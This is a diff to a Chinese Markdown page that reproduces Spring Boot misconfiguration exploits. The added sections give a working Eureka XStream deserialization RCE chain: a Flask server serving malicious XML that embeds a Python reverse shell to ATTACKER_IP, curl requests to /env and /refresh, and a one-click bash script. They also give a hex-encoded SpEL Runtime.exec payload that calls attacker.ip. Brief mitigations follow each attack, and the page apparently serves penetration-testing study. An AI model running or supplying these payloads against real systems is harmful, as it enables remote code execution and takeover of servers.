@@ -1,7 +1,8 @@
 ---
 title: Spring Boot Actuator 配置不当 RCE 利用链复现
-description: 详细记录 Spring Boot 2.x Actuator 暴露 env 与 restart 端点，结合 H2 数据库 CREATE ALIAS
-  实现任意命令执行的完整利用链；补充 H2 Console JNDI 注入及 Spring Cloud Config 目录穿越利用方式。
+description: 详细记录 Spring Boot 2.x Actuator 暴露 env 与 restart 端点结合 H2 CREATE ALIAS 实现
+  RCE 的完整利用链；补充 Eureka XStream 反序列化 RCE 利用链、SpEL 表达式注入、完整 Actuator 端点清单及 /env /refresh
+  交互利用细节、H2 Console JNDI 注入及 Spring Cloud Config 目录穿越利用方式。
 category: ai-security
 tags:
 - Spring Boot
@@ -11,18 +12,59 @@ tags:
 - JNDI Injection
 - Spring Cloud Config
 - 目录穿越
+- Eureka
+- XStream
+- SpEL
 - 漏洞复现
 date: 2024-01-15
 updated: '2026-11-12'
 ---
 ## 概述
 
-本页面汇总 Spring Boot 2.x 生态中三类高危误配置漏洞的利用细节：
-1. **Actuator `env` + `restart` 端点联动 H2 `CREATE ALIAS` 实现 RCE**
-2. **H2 Console 开启 `web-allow-others` 导致 JNDI 注入 RCE**
-3. **Spring Cloud Config Server 目录穿越读取任意文件**
+本页面汇总 Spring Boot 生态中因配置不当导致的高危漏洞利用细节，涵盖四大类攻击面：
+1. **Actuator `env` + `restart` 端点联动 H2 `CREATE ALIAS` 实现 RCE**（Spring Boot 2.x）
+2. **Eureka XStream 反序列化 RCE 利用链**（`/env` + `/refresh` 交互，Spring Cloud 场景）
+3. **Spring Boot SpEL 表达式注入**（Whitelabel Error Page，Spring Boot 1.x）
+4. **H2 Console 开启 `web-allow-others` 导致 JNDI 注入 RCE**
+5. **Spring Cloud Config Server 目录穿越读取任意文件**
 
-所有利用均基于 **配置不当** 而非框架本身代码缺陷，属于攻击面管理的核心排查项。
+所有利用均基于 **配置不当/组件版本过低** 而非框架核心代码缺陷，属于攻击面管理的核心排查项。
+
+---
+
+## 信息收集：常见敏感端点清单
+
+### Swagger / API 文档泄露
+| 路径 | 说明 |
+|------|------|
+| `/api-docs`、`/v2/api-docs` | OpenAPI/Swagger JSON 定义 |
+| `/swagger-ui.html`、 `/api.html`、 `/sw/swagger-ui.html`、 `/api/swagger-ui.html`、 `/template/swagger-ui.html` | Swagger UI 界面 |
+| `/spring-security-rest/api/swagger-ui.html`、 `/spring-security-oauth-resource/swagger-ui.html` | 安全模块下的 Swagger 路径 |
+
+### Actuator 端点全量清单（Spring Boot 1.x / 2.x 路径差异）
+
+| 1.x 路径 | 2.x 路径 (`/actuator/*`) | 敏感度 | 典型利用 |
+|----------|--------------------------|--------|----------|
+| `/env` | `/actuator/env` | ⭐⭐⭐⭐⭐ | 动态修改属性、配合 `/refresh` 触发 RCE |
+| `/refresh` | `/actuator/refresh` | ⭐⭐⭐⭐⭐ | 刷新上下文，触发 `@RefreshScope` Bean 重建 |
+| `/restart` | `/actuator/restart` | ⭐⭐⭐⭐ | 重启上下文，配合 H2 `connection-test-query` RCE |
+| `/heapdump` | `/actuator/heapdump` | ⭐⭐⭐ | 下载堆转储离线分析敏感信息 |
+| `/jolokia` | `/actuator/jolokia` | ⭐⭐⭐⭐ | JMX-over-HTTP，可寻找危险 MBean 执行命令 |
+| `/trace` / `/httptrace` | `/actuator/httptrace` | ⭐⭐ | HTTP 请求追踪，可能泄露 Cookie/Token |
+| `/mappings` | `/actuator/mappings` | ⭐⭐ | 所有 `@RequestMapping` 路由，辅助攻击面梳理 |
+| `/beans` | `/actuator/beans` | ⭐⭐ | Spring Bean 定义，辅助寻找利用链 |
+| `/configprops` | `/actuator/configprops` | ⭐⭐ | `@ConfigurationProperties` 绑定值 |
+| `/metrics` | `/actuator/metrics` | ⭐ | 应用指标 |
+| `/health` | `/actuator/health` | ⭐ | 健康检查（常开放） |
+| `/info` | `/actuator/info` | ⭐ | 应用元信息 |
+| `/shutdown` | `/actuator/shutdown` | ⭐⭐⭐ | 优雅关闭应用（DoS） |
+| `/loggers` | `/actuator/loggers` | ⭐⭐ | 动态调整日志级别 |
+| `/dump` | `/actuator/threaddump` | ⭐ | 线程快照 |
+| `/auditevents` | `/actuator/auditevents` | ⭐ | 审计事件（登录、鉴权失败等） |
+| `/scheduledtasks` | `/actuator/scheduledtasks` | ⭐ | 定时任务列表 |
+| `/flyway`、`/liquibase` | `/actuator/flyway`、`/actuator/liquibase` | ⭐ | 数据库迁移历史 |
+
+> **检测技巧**：`GET /actuator`（2.x）或 `GET /`（1.x）可返回已启用端点列表；若返回 401/403 说明有认证保护，若 200 且列表包含 `env`/`refresh`/`restart`/`jolokia` 等高危端点则需重点跟进。
 
 ---
 
@@ -76,6 +118,153 @@ Content-Type: application/json
 | `env` 写入权限 | `POST /actuator/env` | 200 且后续 `GET /actuator/env` 可见新键值 |
 | H2 依赖 | 类路径存在 `h2-*.jar` | `mvn dependency:tree \| grep h2` |
 | 连接池实现 | `spring.datasource.type=HikariCP` | 默认即为 HikariCP |
+
+---
+
+## Eureka XStream 反序列化 RCE 利用链（`/env` + `/refresh`）
+
+> 来源：微信公众号文章《Spring boot相关漏洞利用（1）》
+
+### 利用条件
+| 条件 | 说明 |
+|------|------|
+| 可访问 `/env` (POST) | 能动态设置 Spring 环境属性 |
+| 可访问 `/refresh` (POST) | 存在 `spring-boot-starter-actuator` 依赖，可刷新配置 |
+| 目标依赖版本 | `eureka-client` < **1.8.7**（通常随 `spring-cloud-starter-netflix-eureka-client` 引入） |
+| 网络连通性 | 目标服务器可主动请求攻击者 HTTP 服务（出网） |
+
+### 攻击原理
+1. 通过 `/env` 设置 `eureka.client.serviceUrl.defaultZone` 指向攻击者控制的 HTTP 服务。
+2. 触发 `/refresh` 刷新上下文，Eureka Client 重新初始化并向 `defaultZone` 发起注册请求。
+3. 攻击者返回精心构造的 **XStream 恶意 XML**，利用 JDK 内置反序列化链（`Jdk.nashorn` / `ProcessBuilder` 等）实现 RCE。
+
+### 完整利用步骤
+
+#### 准备恶意 XML 服务（Flask 示例）
+```python
+#!/usr/bin/env python
+# coding: utf-8
+# Author: LandGrey
+from flask import Flask, Response
+app = Flask(__name__)
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>', methods=['GET', 'POST'])
+def catch_all(path):
+    xml = """<linked-hash-set>
+  <jdk.nashorn.internal.objects.NativeString>
+    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+      <dataHandler>
+        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+          <is class="javax.crypto.CipherInputStream">
+            <cipher class="javax.crypto.NullCipher">
+              <serviceIterator class="javax.imageio.spi.FilterIterator">
+                <iter class="javax.imageio.spi.FilterIterator">
+                  <iter class="java.util.Collections$EmptyIterator"/>
+                  <next class="java.lang.ProcessBuilder">
+                    <command>
+                       <string>/bin/bash</string>
+                       <string>-c</string>
+                       <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
+                    </command>
+                    <redirectErrorStream>false</redirectErrorStream>
+                  </next>
+                </iter>
+                <filter class="javax.imageio.ImageIO$ContainsFilter">
+                  <method>
+                    <class>java.lang.ProcessBuilder</class>
+                    <name>start</name>
+                    <parameter-types/>
+                  </method>
+                  <name>foo</name>
+                </filter>
+                <next class="string">foo</next>
+              </serviceIterator>
+              <lock/>
+            </cipher>
+            <input class="java.lang.ProcessBuilder$NullInputStream"/>
+            <ibuffer></ibuffer>
+          </is>
+        </dataSource>
+      </dataHandler>
+    </value>
+  </jdk.nashorn.internal.objects.NativeString>
+</linked-hash-set>"""
+    return Response(xml, mimetype='application/xml')
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=4447)
+```
+- 将 `ATTACKER_IP` 替换为实际 VPS IP。
+- `command` 标签内为最终执行的命令（示例为反弹 Shell 到 4446 端口）。
+
+#### 启动恶意服务 & 监听反连端口
+```bash
+# 终端 1：启动 Flask 服务
+python3 flask_xstream.py
+
+# 终端 2：监听反弹 Shell 端口
+nc -lvnp 4446
+```
+
+#### 发送利用请求
+```bash
+# ① 修改 Eureka 注册中心地址指向恶意 XML 服务
+curl -X POST "http://target:port/env" \
+     -d "eureka.client.serviceUrl.defaultZone=http://ATTACKER_IP:4447/xstream"
+
+# ② 刷新配置触发 Eureka Client 重新注册 → 请求恶意 XML → 反序列化 RCE
+curl -X POST "http://target:port/refresh" -d ""
+```
+- 若目标为 Spring Boot 2.x，路径需改为 `/actuator/env`、`/actuator/refresh`。
+
+#### 验证结果
+- Flask 控制台显示收到请求。
+- `nc` 成功建立反弹 Shell 会话。
+
+### 缓解措施
+- 升级 `eureka-client` 至 **1.8.7+**（已修复 XStream 反序列化）。
+- 禁用 Actuator `env`/`refresh` 端点或配置强认证。
+- 网络层限制应用服务器出站访问（仅允许必要的服务注册中心地址）。
+
+---
+
+## Spring Boot SpEL 表达式注入（Whitelabel Error Page）
+
+> 影响版本：Spring Boot **1.1.0-1.1.12、1.2.0-1.2.7、1.3.0**
+
+### 漏洞原理
+1. Spring Boot 处理参数绑定/类型转换出错 → 进入 `org.springframework.util.PropertyPlaceholderHelper`。
+2. URL 参数值经 `parseStringValue` 递归解析，`${...}` 包裹的内容被 `ErrorMvcAutoConfiguration.resolvePlaceholder` 当作 **SpEL 表达式** 执行。
+3. 报错页面（Whitelabel Error Page）将表达式计算结果回显，形成 RCE 回显利用链。
+
+### 利用条件
+- 目标版本在受影响范围内。
+- 至少知道一个能触发 **默认错误页面（500/Whitelabel Error Page）** 的接口及参数名。
+
+### 利用步骤
+
+#### 确认注入点
+访问 `http://target/article?id=xxx` 触发 500 错误页 → 尝试 `id=${7*7}` → 若页面回显 `49` 则确认存在 SpEL 注入。
+
+#### 命令编码转换（绕过字符限制）
+```python
+# coding: utf-8
+target = 'curl http://attacker.ip:4445'
+result = ','.join(hex(ord(c)) for c in target)
+print(result)  # 输出如: 0x63,0x75,0x72,0x6c,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x61,0x74,0x74,0x61,0x63,0x6b,0x65,0x72,0x2e,0x69,0x70,0x3a,0x34,0x34,0x34,0x35
+```
+
+#### 构造最终 Payload
+```text
+${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x75,0x72,0x6c,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x61,0x74,0x74,0x61,0x63,0x6b,0x65,0x72,0x2e,0x69,0x70,0x3a,0x34,0x34,0x34,0x35}))}
+```
+- URL 编码后作为参数值发送，命令将在服务端执行。
+
+### 缓解措施
+- 升级 Spring Boot 至 **1.1.13+、1.2.8+、1.3.1+**。
+- 自定义错误页面禁用 Whitelabel Error Page（`server.error.whitelabel.enabled=false`）。
+- 全局异常处理器中避免直接回显用户输入。
 
 ---
 
@@ -175,22 +364,44 @@ requests.post(f"http://{target}/actuator/restart", json={}, headers=headers, tim
 print("[+] Trigger sent")
 ```
 
+### Eureka XStream 利用一键化（Bash）
+```bash
+#!/usr/bin/env bash
+# 用法: ./eureka_xstream.sh <target> <attacker_ip> <flask_port> <nc_port>
+target=$1; attacker=$2; flask_port=$3; nc_port=$4
+
+# 1. 启动 Flask 恶意 XML 服务（后台）
+cat > /tmp/flask_xstream.py <<'EOF'
+# ... 粘贴上文 Flask 代码，将 ATTACKER_IP 替换为 $attacker，4446 替换为 $nc_port ...
+EOF
+python3 /tmp/flask_xstream.py &
+
+# 2. 发送利用链
+curl -X POST "http://$target/env" -d "eureka.client.serviceUrl.defaultZone=http://$attacker:$flask_port/xstream"
+curl -X POST "http://$target/refresh" -d ""
+echo "[+] Exploit sent, check nc listener on port $nc_port"
+```
+
 ---
 
 ## 关联知识与后续利用
 
 - 拿到 Shell 后常需建立隧道穿透内网，可参考 [[frp内网渗透应用]] 中 Socks5 / 多级隧道 / RDP 转发等实战技巧。
 - 若目标同时存在 JWT 认证体系，可结合 [[jwt漏洞原理与实战利用]] 中算法混淆、密钥爆破等手段横向提权。
+- H2 Console JNDI 注入的完整复现流程可参考 [[h2-console-jndi注入rce利用]]。
+- Spring Cloud Config 目录穿越的更多绕过变体见 [[spring-cloud-config目录穿越漏洞]]。
 
 ---
 
 ## 参考资料
-- 原文：微信公众号文章《Spring boot漏洞利用(2)》
+- 原文：微信公众号文章《Spring boot漏洞利用(2)》、《Spring boot相关漏洞利用（1）》
 - su18/JNDI: https://github.com/su18/JNDI
+- LandGrey/SpringBootVulExploit: https://github.com/LandGrey/SpringBootVulExploit
 - Spring Boot Actuator 官方文档：https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
 - H2 Database JNDI 安全公告：https://h2database.com/html/security.html
 - Spring Cloud Config CVE-2020-5410 分析：https://pivotal.io/security/cve-2020-5410
+- Eureka Client XStream 反序列化分析：https://github.com/spring-cloud/spring-cloud-netflix/issues/3276
 
 ## 来源
 
-- [007攻防实验室-202007-202010_5](../sources/007攻防实验室-202007-202010_5.md)
+- [007攻防实验室-202007-202010_6](../sources/007攻防实验室-202007-202010_6.md)
